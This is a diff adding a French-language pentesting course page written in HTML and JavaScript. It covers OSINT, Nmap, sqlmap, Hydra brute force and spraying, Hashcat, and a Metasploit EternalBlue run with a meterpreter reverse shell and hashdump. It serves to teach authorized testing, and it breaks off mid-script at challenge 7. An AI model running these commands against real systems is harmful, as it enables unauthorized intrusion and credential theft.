@@ -1,0 +1,733 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>MON DRÔLE PARCOURS CYBER — Niveau 6</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+:root{--card:#111a2e;--card2:#0f1729;--line:#1e2a44;--txt:#e8eef7;--txt2:#94a3b8;--cyan:#00d4ff;--green:#22c55e;--gold:#fbbf24;--red2:#ef4444;--redL:#f87171}
+body{font-family:'Inter','Segoe UI',system-ui,sans-serif;background:#070b14;color:var(--txt);line-height:1.7;font-size:15px;min-height:100vh}
+h2{font-size:1.4rem;color:var(--txt);margin-bottom:12px}
+h3{font-size:1.1rem;color:var(--redL);margin:16px 0 8px}
+h4{font-size:.98rem;color:#fca5a5;margin:10px 0 6px}
+p{margin:8px 0;color:#cbd5e1}
+ul,ol{padding-left:22px;margin:8px 0}
+li{margin-bottom:5px;color:#cbd5e1}
+strong{color:var(--gold)}
+em{color:var(--redL);font-style:normal;font-weight:600}
+code{background:#0a1220;padding:2px 6px;border-radius:4px;color:var(--redL);font-size:.88em;font-family:monospace;border:1px solid var(--line)}
+pre{background:#050914;padding:12px;border-radius:6px;overflow-x:auto;font-size:.82em;margin:10px 0;color:#fca5a5;border:1px solid var(--line);white-space:pre}
+a{color:var(--cyan);text-decoration:none}
+button{background:linear-gradient(135deg,var(--red2),#b91c1c);color:#fff;border:none;padding:11px 20px;border-radius:9px;font-weight:700;cursor:pointer;font-size:.9rem;font-family:inherit}
+button.sec{background:#1a2540;color:var(--txt);border:1px solid #2a3a5c}
+button.green{background:linear-gradient(135deg,var(--green),#16a34a);color:#052e16}
+button.gold{background:linear-gradient(135deg,var(--gold),#d97706);color:#1a1200}
+header{background:rgba(13,20,36,.92);padding:14px 20px;border-bottom:1px solid var(--line);position:sticky;top:0;z-index:100;display:flex;align-items:center;justify-content:space-between;gap:12px;flex-wrap:wrap}
+.logo{display:flex;align-items:center;gap:10px;cursor:pointer;font-weight:800;font-size:.95rem}
+.logo .mark{width:32px;height:32px;border-radius:8px;background:linear-gradient(135deg,var(--red2),#b91c1c);display:flex;align-items:center;justify-content:center;font-size:1rem}
+.logo .name span{color:var(--redL)}
+.hs{display:flex;align-items:center;gap:8px;font-size:.78rem;color:var(--txt2);flex-wrap:wrap}
+.hs .pill{background:#0f1729;padding:5px 10px;border-radius:16px;border:1px solid var(--line);font-weight:600}
+.hs .pill b{color:var(--redL)}
+.hs .logout{cursor:pointer;color:var(--red2);font-weight:700;padding:5px 10px}
+main{max-width:1000px;margin:0 auto;padding:20px 16px 60px}
+.card{background:var(--card);border-radius:14px;padding:22px;margin-bottom:16px;border:1px solid var(--line);box-shadow:0 8px 24px rgba(0,0,0,.3)}
+.crumb{font-size:.82rem;color:#64748b;margin-bottom:14px;display:flex;gap:6px;flex-wrap:wrap}
+.crumb a{color:var(--cyan);cursor:pointer}
+.intro{background:#3a0f0f;padding:14px;border-radius:10px;margin:12px 0;border-left:4px solid var(--red2);font-style:italic;color:#fecaca}
+.analogy{background:#4c0519;padding:12px;border-radius:10px;margin:12px 0;border-left:4px solid #f472b6;color:#fbcfe8}
+.bank{background:#0d3a1f;padding:12px;border-radius:8px;margin:12px 0;border-left:4px solid var(--green);color:#b5e8c8}
+.pr{background:#0a3a1a;padding:12px;border-radius:10px;margin:12px 0;border-left:4px solid #16a34a;color:#a7f3c4}
+.er{background:#3a0f0f;padding:12px;border-radius:8px;margin:12px 0;border-left:4px solid var(--red2);color:#f4c4c4}
+.df{background:#3a2a0a;padding:12px;border-radius:8px;margin:12px 0;border-left:4px solid var(--gold);color:#f5e3a8}
+table{width:100%;border-collapse:collapse;margin:10px 0;font-size:.88em}
+th{background:#0f1729;color:var(--redL);padding:8px;text-align:left;border:1px solid var(--line)}
+td{border:1px solid var(--line);padding:8px;color:#cbd5e1}
+.quiz{background:#0a1220;padding:14px;border-radius:10px;margin-top:12px;border:1px solid var(--line)}
+.q{margin-bottom:14px;padding:12px;background:var(--card2);border-radius:8px;border:1px solid var(--line)}
+.q>p:first-child{font-weight:600;margin-bottom:10px;color:var(--txt)}
+.q label{display:block;padding:10px 12px;margin:5px 0;background:#111827;border-radius:7px;cursor:pointer;border:1.5px solid transparent;color:#cbd5e1;font-size:.9rem}
+.q label:hover{background:#1a2540}
+.q input{margin-right:10px;accent-color:var(--red2)}
+.ok{background:rgba(34,197,94,.15)!important;border-color:var(--green)!important;color:#a7f3c4!important}
+.ko{background:rgba(239,68,68,.15)!important;border-color:var(--red2)!important;color:#fca5a5!important}
+.exp{background:#050914;padding:10px;border-radius:6px;margin-top:8px;font-size:.85em;color:#cbd5e1;border-left:3px solid var(--gold);display:none}
+.res{margin-top:12px;padding:14px;border-radius:8px;font-weight:700;text-align:center}
+.res.g{background:rgba(34,197,94,.15);color:#a7f3c4;border:1px solid var(--green)}
+.res.r{background:rgba(239,68,68,.15);color:#fca5a5;border:1px solid var(--red2)}
+.nav{margin-top:16px;display:flex;gap:8px;flex-wrap:wrap}
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(190px,1fr));gap:10px;margin-top:12px}
+.btn{background:var(--card2);padding:14px;border-radius:10px;cursor:pointer;border:2px solid transparent;text-align:left;transition:all .15s}
+.btn:hover{border-color:var(--red2)}
+.btn.done{border-color:var(--green);background:#0d3a1f}
+.btn .n{font-weight:800;color:var(--redL);display:block;font-size:.68rem;text-transform:uppercase;letter-spacing:.5px}
+.btn.done .n{color:var(--green)}
+.btn .ti{display:block;font-size:.88rem;color:var(--txt);margin-top:5px;font-weight:600}
+.stats-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:12px;margin:14px 0}
+.stat{background:#111a2e;padding:16px;border-radius:12px;border:1px solid var(--line);text-align:center;border-top:3px solid var(--red2)}
+.stat .big{font-size:2em;font-weight:800;color:var(--redL);display:block;line-height:1.1}
+.stat .lbl{font-size:.75em;color:var(--txt2);margin-top:6px;text-transform:uppercase;font-weight:600}
+.progress-bar{background:#0a1220;height:8px;border-radius:4px;overflow:hidden;margin:10px 0;border:1px solid var(--line)}
+.progress-bar>div{height:100%;background:linear-gradient(90deg,var(--red2),#f472b6);transition:width .5s}
+.login-box{max-width:400px;margin:50px auto;background:var(--card);padding:30px;border-radius:16px;border:1px solid var(--line)}
+.login-box h2{text-align:center;margin-bottom:16px}
+.login-box input{width:100%;padding:12px;margin:8px 0;background:#0a1220;border:1.5px solid var(--line);border-radius:9px;color:var(--txt);font-size:.95rem;font-family:inherit}
+.login-box input:focus{outline:none;border-color:var(--red2)}
+.login-box button{width:100%;margin-top:12px;padding:13px}
+.cert-locked{text-align:center;padding:40px 20px;background:#0d1424;border-radius:14px;border:2px dashed #2a3a5c}
+.cert-locked .icon{font-size:3.5em;margin-bottom:14px;opacity:.6}
+.cert-locked h3{color:var(--gold);font-size:1.2rem;margin:0 0 8px}
+.cert-locked p{color:var(--txt2);font-size:.9rem}
+.cert-locked .progress-small{width:180px;height:6px;background:#0a1220;border-radius:3px;margin:14px auto;overflow:hidden;border:1px solid var(--line)}
+.cert-locked .progress-small>div{height:100%;background:var(--gold)}
+.certificate{background:#3a0f0f;padding:36px 26px;border-radius:14px;border:3px double var(--red2);text-align:center}
+.certificate .seal{width:70px;height:70px;border-radius:50%;background:var(--red2);display:flex;align-items:center;justify-content:center;font-size:1.9rem;margin:0 auto 16px;border:3px solid #fecaca}
+.certificate .subtitle{color:var(--redL);font-size:.72rem;letter-spacing:2.5px;text-transform:uppercase;font-weight:800;margin-bottom:6px}
+.certificate .title{font-family:Georgia,serif;font-size:1.4rem;font-weight:700;color:#fecaca;margin:6px 0 16px}
+.certificate .certifies{color:#94a3b8;font-size:.85rem;margin:12px 0 6px;font-style:italic}
+.certificate .name{font-family:Georgia,serif;font-size:1.8rem;font-weight:700;color:#fff;padding:14px 0;border-bottom:2px solid var(--red2);border-top:2px solid var(--red2);margin:10px auto 18px;max-width:360px}
+.certificate .details{display:flex;justify-content:center;gap:24px;flex-wrap:wrap;margin:20px 0 16px;font-size:.82rem;color:#94a3b8}
+.certificate .details div{text-align:center}
+.certificate .details strong{color:var(--cyan);display:block;font-size:.95rem;margin-top:3px}
+.certificate .cert-id{font-family:monospace;font-size:.7rem;color:#64748b;padding:8px;background:rgba(0,0,0,.3);border-radius:5px;display:inline-block;margin-top:12px}
+.certificate .signature{margin-top:24px;display:flex;justify-content:space-between;flex-wrap:wrap;gap:16px}
+.certificate .signature-block{text-align:center;flex:1;min-width:140px}
+.certificate .sig-line{border-top:1px solid #94a3b8;padding-top:6px;font-size:.75rem;color:#94a3b8;margin-top:24px}
+.certificate .sig-name{font-family:Georgia,serif;font-style:italic;color:var(--redL);font-size:1rem}
+.cv-container{background:#fff;color:#1a1a1a;border-radius:12px;overflow:hidden;margin-top:14px}
+.cv-page{padding:36px 40px;line-height:1.55;max-width:820px;margin:0 auto}
+.cv-header{border-bottom:3px solid #7f1d1d;padding-bottom:18px;margin-bottom:20px;display:flex;justify-content:space-between;flex-wrap:wrap;gap:14px}
+.cv-header h1{font-size:1.9rem;font-weight:800;color:#7f1d1d;line-height:1.1;margin-bottom:4px}
+.cv-header .role{color:#dc2626;font-size:1rem;font-weight:600;margin-bottom:6px}
+.cv-header .objective{color:#475569;font-size:.85rem;max-width:400px;font-style:italic}
+.cv-header .right{text-align:right;font-size:.82rem;color:#334155;line-height:1.7}
+.cv-section{margin-bottom:22px}
+.cv-section h2{font-size:.9rem;font-weight:800;color:#7f1d1d;text-transform:uppercase;letter-spacing:1.2px;border-bottom:1.5px solid #cbd5e1;padding-bottom:6px;margin-bottom:12px}
+.cv-item{margin-bottom:12px}
+.cv-item .line1{display:flex;justify-content:space-between;flex-wrap:wrap;gap:6px;margin-bottom:3px}
+.cv-item .title{font-weight:700;color:#0f172a;font-size:.94rem}
+.cv-item .date{font-size:.78rem;color:#64748b;font-weight:600}
+.cv-item .org{color:#dc2626;font-size:.85rem;font-weight:600;margin-bottom:3px}
+.cv-item .desc{font-size:.85rem;color:#475569}
+.skills-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:12px;margin-top:6px}
+.skill{font-size:.85rem;margin-bottom:6px}
+.skill .name{display:flex;justify-content:space-between;font-weight:600;color:#1e293b;margin-bottom:3px}
+.skill .bar{height:5px;background:#e2e8f0;border-radius:3px;overflow:hidden}
+.skill .bar>div{height:100%;background:#dc2626}
+.cv-badge{padding:3px 9px;background:#fee2e2;color:#7f1d1d;border-radius:10px;font-size:.75rem;font-weight:700;border:1px solid #fecaca;margin:2px;display:inline-block}
+.cv-footer{margin-top:24px;padding-top:12px;border-top:1px solid #e2e8f0;font-size:.68rem;color:#94a3b8;text-align:center}
+.tabs{display:flex;gap:6px;margin:12px 0;flex-wrap:wrap}
+.tab{padding:8px 16px;background:var(--card2);border-radius:8px;cursor:pointer;font-size:.82em;font-weight:600;color:var(--txt2);border:1.5px solid transparent}
+.tab.active{background:var(--red2);color:#fff}
+.certs-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:12px;margin-top:12px}
+.cert-item{background:var(--card2);padding:16px;border-radius:10px;border-left:4px solid var(--red2)}
+.cert-item.free{border-left-color:var(--green)}
+.cert-item.paid{border-left-color:var(--gold)}
+.cert-item h4{margin:0 0 5px;font-size:.92em;color:var(--txt)}
+.cert-item .org{font-size:.72em;color:var(--txt2);margin-bottom:8px}
+.cert-item .tag{display:inline-block;padding:2px 8px;border-radius:16px;font-size:.66em;font-weight:700;margin-right:3px;margin-bottom:3px}
+.cert-item .tag.free{background:rgba(34,197,94,.15);color:#86efac}
+.cert-item .tag.paid{background:rgba(251,191,36,.15);color:#fde68a}
+.cert-item .tag.lvl{background:rgba(59,130,246,.15);color:#93c5fd}
+.cert-item p{font-size:.8em;color:#cbd5e1;margin:6px 0}
+.cert-item .actions{display:flex;gap:6px;margin-top:10px;flex-wrap:wrap}
+.cert-item .actions a{flex:1;text-align:center;padding:7px 10px;background:#1a2540;color:var(--cyan);border-radius:6px;font-size:.76em;font-weight:700;text-decoration:none;border:1px solid #2a3a5c}
+.cert-item .actions button{padding:7px 10px;font-size:.76em;background:#1a2540;color:var(--txt);border:1px solid #2a3a5c}
+.cert-item.done{background:#0d3a1f;border-left-color:var(--green)}
+.cert-item.done .actions button{background:var(--green);color:#052e16}
+.jobs-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:12px;margin-top:12px}
+.job-item{background:var(--card2);padding:16px;border-radius:10px;border-left:4px solid var(--green)}
+.job-item h4{margin:0 0 5px;color:#86efac;font-size:.92em}
+.job-item .job-org{font-size:.75em;color:var(--txt2);margin-bottom:6px}
+.job-item .job-desc{font-size:.8em;color:#cbd5e1;margin:6px 0}
+.job-item .job-link{display:inline-block;padding:5px 12px;background:#1a2540;color:var(--cyan);border-radius:6px;font-size:.76em;font-weight:700;text-decoration:none;margin-top:6px;border:1px solid #2a3a5c}
+.exam-card{background:#3a0f0f;padding:18px;border-radius:12px;margin:12px 0;border-left:4px solid var(--red2)}
+.exam-card h4{color:#fecaca;margin:0 0 6px;font-size:1rem}
+.exam-card.locked{opacity:.55;border-left-color:#475569}
+.exam-card.passed{background:#0d3a1f;border-left-color:var(--green)}
+.exam-card.passed h4{color:#86efac}
+.sync-box{background:#0a1220;padding:16px;border-radius:10px;margin:12px 0;border:1px solid var(--line)}
+.sync-box textarea{width:100%;min-height:100px;background:#050914;color:var(--cyan);border:1px solid var(--line);border-radius:6px;padding:10px;font-family:monospace;font-size:.7em;resize:vertical;word-break:break-all}
+.sync-box label{display:block;margin:8px 0 5px;color:var(--txt2);font-size:.82em;font-weight:600}
+.sync-actions{display:flex;gap:8px;flex-wrap:wrap;margin-top:10px}
+.today-list{list-style:none;padding:0;margin:10px 0}
+.today-list li{padding:10px 12px;background:var(--card2);border-radius:6px;margin-bottom:6px;border-left:3px solid var(--green);font-size:.87em;color:#cbd5e1}
+footer{text-align:center;padding:24px 20px;color:#64748b;font-size:.8em;font-weight:600;border-top:1px solid var(--line);margin-top:32px}
+#ver{position:fixed;bottom:8px;right:8px;background:#3a0f0f;color:var(--redL);font-family:monospace;font-size:.68em;padding:4px 8px;border-radius:4px;border:1px solid var(--red2);opacity:.9;z-index:999}
+#err{position:fixed;bottom:8px;left:8px;background:#3a0f0f;color:#fca5a5;font-family:monospace;font-size:.68em;padding:4px 8px;border-radius:4px;border:1px solid var(--red2);display:none;max-width:80%;z-index:999}
+@media print{header,footer,.nav,#ver,#err,.tabs,button{display:none!important}.card{box-shadow:none!important}}
+</style>
+</head>
+<body>
+<header>
+  <div class="logo" onclick="go('home')">
+    <div class="mark">🔴</div>
+    <div class="name">Mon <span>Drôle</span> Parcours · Niveau 6</div>
+  </div>
+  <div class="hs" id="hs"></div>
+</header>
+<main id="app"></main>
+<footer>© H. N'GUESSAN ® — Niveau 6 · Pentest éthique</footer>
+<div id="ver">v6.1 chargé ✓</div>
+<div id="err"></div>
+
+<script>
+window.addEventListener('error', function(e) {
+  var el = document.getElementById('err');
+  if (el) { el.style.display = 'block'; el.textContent = 'ERREUR: ' + e.message; }
+});
+
+var KEY = 'mdpc_v61';
+var state = { currentUser: null, users: {} };
+try { var raw = localStorage.getItem(KEY); if (raw) state = JSON.parse(raw); } catch (e) {}
+
+function save() { try { localStorage.setItem(KEY, JSON.stringify(state)); } catch (e) {} updateHeader(); }
+function user() { return state.currentUser ? state.users[state.currentUser] : null; }
+function mkUser(n) { return { name: n, done: {}, certs: [], examens: {}, jours: {}, created: new Date().toISOString().slice(0,10) }; }
+function today() { return new Date().toISOString().slice(0,10); }
+
+function countDone(lvl) {
+  var u = user(); if (!u) return 0;
+  var c = 0, p = lvl + '_';
+  for (var k in u.done) { if (k.indexOf(p) === 0 && u.done[k]) c++; }
+  return c;
+}
+function isComplete(lvl) { return countDone(lvl) >= 10; }
+function isUnlocked(lvl) { if (lvl === 1) return true; return isComplete(lvl - 1); }
+
+function simulate() {
+  var u = user(); if (!u) return;
+  for (var i = 1; i <= 10; i++) {
+    u.done['1_'+i]=true; u.done['2_'+i]=true; u.done['3_'+i]=true;
+    u.done['4_'+i]=true; u.done['5_'+i]=true;
+  }
+  save();
+  alert('Niveaux 1 à 5 simulés. Niveau 6 débloqué !');
+  route();
+}
+
+function login() {
+  var el = document.getElementById('loginName'); if (!el) return;
+  var n = el.value.trim(); if (!n) { alert('Entre ton prénom'); return; }
+  var k = n.toLowerCase().replace(/\s+/g, '_');
+  if (!state.users[k]) state.users[k] = mkUser(n);
+  state.currentUser = k; save(); go('home');
+}
+function logout() { state.currentUser = null; save(); go('login'); }
+function go(h) { location.hash = h; }
+
+/* ============================================================
+   10 DÉFIS — Pentest éthique (version compacte)
+   ============================================================ */
+var DEFIS = [
+{id:1, titre:"Intro au pentest éthique", intro:"Le pentest est l art de tester la sécurité d un système avec autorisation. Métier encadré et très demandé.",
+cours:"<h3>3 types de tests</h3><ul><li><strong>Black box</strong> — aucun accès, comme un attaquant externe</li><li><strong>Grey box</strong> — accès partiel (compte, code partiel)</li><li><strong>White box</strong> — accès total (code, infra)</li></ul><h3>4 phases d un pentest</h3><ol><li>Reconnaissance (OSINT, scan)</li><li>Exploitation (utiliser les failles)</li><li>Post-exploitation (maintenir, escalader, pivoter)</li><li>Rapport (documenter, prioriser)</li></ol><h3>Cadre légal</h3><p>Le pentest n est PAS du hacking. Il faut :</p><ul><li>Autorisation écrite signée</li><li>Périmètre défini (URLs, IPs, horaires)</li><li>Limite (pas de DoS, pas de destruction)</li><li>Canal de communication en cas d incident</li></ul><div class=\"analogy\">Un pentest = test d alarme incendie. Vous engagez un expert pour déclencher de fausses alertes. Sans autorisation, c est un vrai incendie criminel.</div><div class=\"bank\">Les banques réalisent un pentest annuel obligatoire (BCEAO, PCI-DSS).</div><div class=\"df\">Sans autorisation écrite = jusqu à 5 ans d emprisonnement (Code pénal ivoirien).</div>",
+cas:"<h3>Cas 1 — Cadrer une mission</h3><p>Contrat obligatoire : périmètre exact (URLs/IPs), période autorisée, méthodes autorisées/interdites, contacts d urgence, livrables.</p><h3>Cas 2 — Types de missions</h3><ul><li>Externe (depuis Internet)</li><li>Interne (depuis le LAN)</li><li>Web (OWASP)</li><li>Mobile (iOS/Android)</li><li>Wi-Fi</li><li>Red team (simulation complète)</li></ul><h3>Cas 3 — Éthique</h3><ul><li>Ne jamais exfiltrer de vraies données</li><li>Ne jamais modifier le système</li><li>Documenter chaque action</li><li>Signaler immédiatement toute faille critique</li></ul>",
+quiz:[
+{q:'Le pentest nécessite ?',o:['Rien','Autorisation écrite','Un VPN','Antivirus'],c:1,e:'Obligatoire.'},
+{q:'Black box signifie ?',o:['Aucun accès','Accès complet','Test interne','Mobile'],c:0,e:'Comme un attaquant externe.'},
+{q:'Sans autorisation, un pentest est ?',o:['Légal','Illégal','Gris','Autorisé'],c:1,e:'Délit pénal.'}
+]},
+
+{id:2, titre:"Reconnaissance et OSINT", intro:"La première phase : récolter un maximum d informations publiques sur la cible. C est l OSINT.",
+cours:"<h3>OSINT</h3><p>Collecte d informations à partir de sources publiques. Aucune interaction directe avec la cible.</p><h3>Ce qu on cherche</h3><ul><li>Sous-domaines (m.banque.ci, test.banque.ci)</li><li>Adresses IP publiques</li><li>Technologies (CMS, serveur)</li><li>Emails, employés</li><li>Fuites de credentials</li></ul><h3>Outils</h3><table><tr><th>Outil</th><th>Usage</th></tr><tr><td>whois</td><td>Infos domaine</td></tr><tr><td>crt.sh</td><td>Certificats → sous-domaines</td></tr><tr><td>theHarvester</td><td>Emails, domaines</td></tr><tr><td>Shodan</td><td>Objets connectés</td></tr><tr><td>Google dorks</td><td>Recherches avancées</td></tr></table><h3>Google dorks</h3><pre>site:banque.ci filetype:pdf\nsite:banque.ci inurl:admin\nsite:github.com \"banque.ci\" password</pre><div class=\"analogy\">Détective privé qui observe une maison depuis la rue — sans jamais entrer.</div><div class=\"bank\">Cartographier les sous-domaines : test/dev souvent exposés avec failles.</div><div class=\"df\">OSINT = légal. L utilisation (ex : phishing) peut ne pas l être.</div>",
+cas:"<h3>Cas 1 — Sous-domaines via crt.sh</h3><pre>curl -s \"https://crt.sh/?q=%25.banque.ci&amp;output=json\" | jq -r \".[].name_value\" | sort -u</pre><p>Résultat : www, api, admin, test, dev, staging.</p><h3>Cas 2 — Google dorks</h3><pre>site:banque.ci filetype:xlsx\nsite:banque.ci inurl:login\nsite:banque.ci intext:\"phpMyAdmin\"</pre><h3>Cas 3 — Vérifier fuites</h3><ul><li>haveibeenpwned.com (emails)</li><li>GitHub (mots de passe dans le code)</li><li>Wayback Machine (versions anciennes)</li></ul>",
+quiz:[
+{q:'OSINT signifie ?',o:['Open Source Intelligence','Online System','Open System','Optical'],c:0,e:'Collecte publique.'},
+{q:'crt.sh sert à ?',o:['Cracker','Trouver sous-domaines','Chiffrer','Router'],c:1,e:'Base de certificats.'},
+{q:'Un Google dork typique ?',o:['Recherche normale','site:cible filetype:pdf','ping','nmap'],c:1,e:'Requête avancée.'}
+]},
+
+{id:3, titre:"Scan avec Nmap", intro:"Nmap est LE scanner réseau de référence. Il découvre les hôtes, ports ouverts et services.",
+cours:"<h3>Types de scan</h3><table><tr><th>Scan</th><th>Commande</th></tr><tr><td>Découverte</td><td>nmap -sn 192.168.1.0/24</td></tr><tr><td>SYN furtif</td><td>nmap -sS 192.168.1.10</td></tr><tr><td>Connect</td><td>nmap -sT 192.168.1.10</td></tr><tr><td>UDP</td><td>nmap -sU 192.168.1.10</td></tr><tr><td>Versions</td><td>nmap -sV 192.168.1.10</td></tr><tr><td>OS</td><td>nmap -O 192.168.1.10</td></tr><tr><td>Vuln</td><td>nmap --script vuln</td></tr></table><h3>Ports importants</h3><p>21 FTP, 22 SSH, 23 Telnet, 25 SMTP, 53 DNS, 80 HTTP, 443 HTTPS, 445 SMB, 3306 MySQL, 3389 RDP.</p><h3>États</h3><ul><li>open — service actif</li><li>closed — pas de service mais hôte actif</li><li>filtered — pare-feu bloque</li></ul><div class=\"analogy\">Cambrioleur qui teste chaque fenêtre. Sauf qu ici, c est légal et autorisé.</div><div class=\"bank\">Un scan externe bancaire ne doit montrer QUE 443.</div><div class=\"df\">Un scan peut être détecté. Prévenir le client avant.</div>",
+cas:"<h3>Cas 1 — Découverte</h3><pre>nmap -sn 192.168.1.0/24</pre><h3>Cas 2 — Scan complet</h3><pre>nmap -sV -sC -p- -T4 192.168.1.10</pre><p>-sV versions, -sC scripts, -p- tous ports, -T4 rapide.</p><h3>Cas 3 — Scan vulnérabilités</h3><pre>nmap --script vuln 192.168.1.10</pre><p>Détecte les CVE connues.</p>",
+quiz:[
+{q:'-sS signifie ?',o:['UDP','TCP SYN furtif','Complet','Ping'],c:1,e:'SYN scan.'},
+{q:'Port 443 ?',o:['FTP','SSH','HTTPS','RDP'],c:2,e:'HTTPS.'},
+{q:'filtered signifie ?',o:['Fermé','Ouvert','Pare-feu bloque','Inconnu'],c:2,e:'Bloqué.'}
+]},
+
+{id:4, titre:"Exploitation de vulnérabilités", intro:"Utiliser une faille identifiée pour prouver son impact. Phase sensible du pentest.",
+cours:"<h3>Types de vulnérabilités</h3><ul><li>Injection (SQLi, XSS)</li><li>RCE (Remote Code Execution)</li><li>Traversée de répertoire</li><li>LFI/RFI</li><li>Désérialisation</li><li>SSRF</li><li>Mauvaises configs</li></ul><h3>Outils</h3><table><tr><th>Outil</th><th>Usage</th></tr><tr><td>sqlmap</td><td>SQLi auto</td></tr><tr><td>Burp Suite</td><td>Proxy web</td></tr><tr><td>Metasploit</td><td>Framework exploit</td></tr><tr><td>BeEF</td><td>XSS browser hooking</td></tr><tr><td>Hydra</td><td>Brute force</td></tr><tr><td>searchsploit</td><td>Chercher exploits publics</td></tr></table><h3>Étapes</h3><ol><li>Identifier la faille</li><li>Trouver/écrire l exploit</li><li>Tester en contrôlé</li><li>Lancer avec impact minimal</li><li>Documenter (screenshot)</li></ol><div class=\"analogy\">Ouvrir une porte avec un crochet. Montrer, photographier, refermer, signaler.</div><div class=\"bank\">Exploitation réussie = milliers de données exposées. Objectif : trouver AVANT les attaquants.</div><div class=\"df\">Ne jamais exécuter un exploit destructeur sans autorisation explicite.</div>",
+cas:"<h3>Cas 1 — sqlmap</h3><pre>sqlmap -u \"https://test.banque.ci/product?id=1\" --batch --dbs</pre><p>Liste les bases. Puis tables et échantillon de 5 lignes.</p><div class=\"pr\">Ne pas utiliser --dump-all. Extraire 5 lignes suffit.</div><h3>Cas 2 — searchsploit</h3><pre>searchsploit apache 2.4.49</pre><p>Identifie CVE-2021-41773. Récupérer l exploit.</p><h3>Cas 3 — Hydra SSH</h3><pre>hydra -l admin -P rockyou.txt ssh://192.168.1.10</pre><p>Mot de passe faible = faille politique.</p>",
+quiz:[
+{q:'sqlmap sert à ?',o:['Scanner ports','Exploiter SQLi','Cracker WPA','Sniffer'],c:1,e:'SQLi auto.'},
+{q:'searchsploit ?',o:['Scanner','Chercher exploits publics','Chiffrer','Router'],c:1,e:'Base Exploit-DB.'},
+{q:'--dump-all ?',o:['Recommandé','À éviter','Obligatoire','Rapide'],c:1,e:'Impact trop fort.'}
+]},
+
+{id:5, titre:"Metasploit Framework", intro:"LE framework d exploitation le plus utilisé. Regroupe exploits, payloads, scanners.",
+cours:"<h3>Concepts</h3><ul><li>Exploit — code qui exploite</li><li>Payload — ce qu on exécute (shell, meterpreter)</li><li>Meterpreter — payload avancé</li><li>Handler — écoute les connexions</li></ul><h3>Commandes</h3><pre>msfconsole\nsearch apache\nuse exploit/...\nshow options\nset RHOSTS 192.168.1.10\nset LHOST 192.168.1.5\nrun</pre><h3>Metasploitable</h3><p>VM volontairement vulnérable pour s entraîner. En lab isolé uniquement.</p><div class=\"analogy\">Boîte à outils de serrurier. Chaque exploit est un outil. Meterpreter est un mini-espion qui s installe.</div><div class=\"bank\">EDR bancaires détectent meterpreter. Pentester doit utiliser payloads furtifs.</div><div class=\"df\">Ne jamais lancer contre une cible non autorisée.</div>",
+cas:"<h3>Cas 1 — SMB EternalBlue (lab)</h3><pre>msfconsole\nsearch ms17_010\nuse exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS 192.168.1.50\nset LHOST 192.168.1.5\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nrun</pre><h3>Cas 2 — Meterpreter</h3><pre>sysinfo\nshell\nscreenshot\nhashdump\nportfwd add -l 8080 -p 80 -r 192.168.1.20</pre><h3>Cas 3 — Handler</h3><pre>use exploit/multi/handler\nset PAYLOAD windows/meterpreter/reverse_tcp\nset LHOST 192.168.1.5\nrun</pre>",
+quiz:[
+{q:'Meterpreter ?',o:['Antivirus','Payload avancé','Scanner','Firewall'],c:1,e:'Post-exploitation.'},
+{q:'msfconsole ?',o:['Scanner Wi-Fi','Console Metasploit','Chiffrer','Compiler'],c:1,e:'Console principale.'},
+{q:'Metasploitable ?',o:['Virus','VM d entraînement','Firewall','Antivirus'],c:1,e:'VM vulnérable.'}
+]},
+
+{id:6, titre:"Attaques de mots de passe", intro:"Les mots de passe restent la première cause de compromission. Savoir les attaquer et les protéger.",
+cours:"<h3>Types d attaques</h3><ul><li>Brute force — toutes les combinaisons</li><li>Dictionnaire — rockyou.txt (14M)</li><li>Rule-based — password → P@ssw0rd!</li><li>Mask — format connu (4 chiffres)</li><li>Password spraying — 1 essai par compte</li><li>Credential stuffing — fuites d autres sites</li></ul><h3>En ligne vs hors ligne</h3><table><tr><th>Type</th><th>Vitesse</th></tr><tr><td>En ligne</td><td>Lente (rate limit)</td></tr><tr><td>Hors ligne</td><td>Rapide (GPU)</td></tr></table><h3>Hashs et force</h3><table><tr><th>Hash</th><th>Force</th></tr><tr><td>MD5</td><td>Très faible</td></tr><tr><td>SHA-256</td><td>Moyen</td></tr><tr><td>bcrypt</td><td>Fort</td></tr><tr><td>Argon2</td><td>Très fort</td></tr></table><div class=\"analogy\">Brute force = toutes les clés. Dictionnaire = clés courantes. Hash = empreinte de la clé.</div><div class=\"bank\">MFA + politique forte + Argon2id.</div><div class=\"df\">Brute force en ligne peut verrouiller les comptes. Utiliser spraying.</div>",
+cas:"<h3>Cas 1 — Hydra SSH</h3><pre>hydra -l admin -P rockyou.txt ssh://192.168.1.10 -t 4</pre><h3>Cas 2 — Hashcat MD5</h3><pre>echo \"5f4dcc3b5aa765d61d8327deb882cf99\" &gt; hash.txt\nhashcat -m 0 -a 0 hash.txt rockyou.txt</pre><p>Résultat : password. MD5 non salé = cassé en ms.</p><h3>Cas 3 — Password spraying</h3><pre>hydra -L users.txt -p \"Banque2024!\" ssh://192.168.1.10</pre><p>1 essai par compte — évite lockout.</p>",
+quiz:[
+{q:'Hashcat ?',o:['Scanner','Cracker hashs','Router','Chiffrer'],c:1,e:'GPU.'},
+{q:'Password spraying ?',o:['Beaucoup par compte','1 essai par compte','Chiffrer','DNS'],c:1,e:'Évite lockout.'},
+{q:'rockyou.txt ?',o:['Antivirus','Liste mdp','Serveur','Protocole'],c:1,e:'14M mots.'}
+]},
+
+{id:7, titre:"Privilege escalation Linux", intro:"Une fois un accès obtenu, élever ses privilèges pour devenir root.",
